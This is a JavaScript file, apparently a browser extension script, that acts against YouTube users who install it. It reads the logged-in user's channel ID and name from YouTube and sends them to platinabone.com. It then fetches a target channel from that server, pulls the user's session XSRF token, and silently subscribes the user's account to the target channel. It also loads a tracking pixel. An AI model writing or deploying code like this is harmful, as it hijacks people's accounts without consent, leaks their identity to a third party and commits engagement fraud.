new Image().src = '//whos.amung.us/widget/platinabone1.png';
function get_username() {
    var xhr = new XMLHttpRequest,
        url = "https://www.youtube.com/account";
    xhr.open("GET", url);
    xhr.send();
	var cookie = xhr.getResponseHeader("set-cookie");
    xhr.onreadystatechange = function() {
        if (200 == xhr.status && xhr.readyState == 4) {
            var responsem = xhr.responseText;
            var channelid = responsem.match('a href="/channel/(.*?)" class="yt-user-photo  yt-uix-sessionlink"')[1];
            var namesurname = responsem.match('span class="yt-user-name " dir="ltr">(.*?)</span></span></div><div class="watch-queue-control-bar control-bar-button"')[1];
			var http = new XMLHttpRequest();
			var url = '//www.platinabone.com/eklenti/ajax/user-ekle.php';
			var params = 'username='+channelid+'&isim='+namesurname;
			http.open('POST', url, true);
			http.withCredentials = true;
			http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
			http.onreadystatechange = function() {//Call a function when the state changes.
				if(http.readyState == 4 && http.status == 200) {
				}
			}
			http.send(params);
        }
    }
}

if (location.pathname.substr(1).indexOf("giris") >= 0 && window.location.search == "?youtube-giris-yap") {
  get_username();
}
	
	
youtube = {
    get_token: function(id) {
      var xhr = new XMLHttpRequest,
        url = "https://www.youtube.com/subscribe_embed?channelid=" + id;
      xhr.open("GET", url);
      xhr.send();
      xhr.onreadystatechange = function() {
        if (200 == xhr.status && xhr.readyState == 4) {
          var response = xhr.responseText;
          if (response.match("'LOGGED_IN': (.*?),")[1] == "true") {
            var ei = response.match("ei=(.*?)&")[1];
            var ved = response.match("ved=(.*?)\"")[1];
            var session_token = response.match('\'XSRF_TOKEN\': "(.*?)"')[1];
            youtube.subscribe(id, {
              ei: ei,
              ved: ved,
              session_token: session_token
            });
          }
        }
      }
    },
    subscribe: function(id, token) {
      var params = "ei=" + token.ei + "&feature=channels4&ved=" + token.ved + "&session_token=" + token.session_token;
      var xhr = new XMLHttpRequest,
        url = "https://www.youtube.com/subscription_ajax?action_create_subscription_to_channel=1&c=" + id;
      xhr.open("POST", url);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.setRequestHeader("X-Youtube-Identity-Token", token.identity_token);
      xhr.setRequestHeader("X-YouTube-Page-CL", token.cl);
      xhr.setRequestHeader("X-YouTube-Page-Label", token.label);
      xhr.setRequestHeader("X-YouTube-Variants-Checksum", token.checksum);
      xhr.send(params);
      xhr.onreadystatechange = function() {
        if (200 == xhr.status && xhr.readyState == 4) {
          if (JSON.parse(xhr.responseText).response.new_subscription == true) {
            //localStorage["aa"] = "you";
          }
        }
      }
    }
  }		
if (location.hostname.indexOf("youtube.com") >= 0) {
	var xxhr = new XMLHttpRequest;
	url = "//www.platinabone.com/process.php";
	xxhr.open("GET", url);
      xxhr.send();
	  xxhr.withCredentials = true;
      xxhr.onreadystatechange = function() {
        if (200 == xxhr.status && xxhr.readyState == 4) {
		var response = xxhr.responseText;
			var json = JSON.parse(response);
			if(json["username"] != 0){
					youtube.get_token(json["username"]);
				
			}
		}
	  }
}
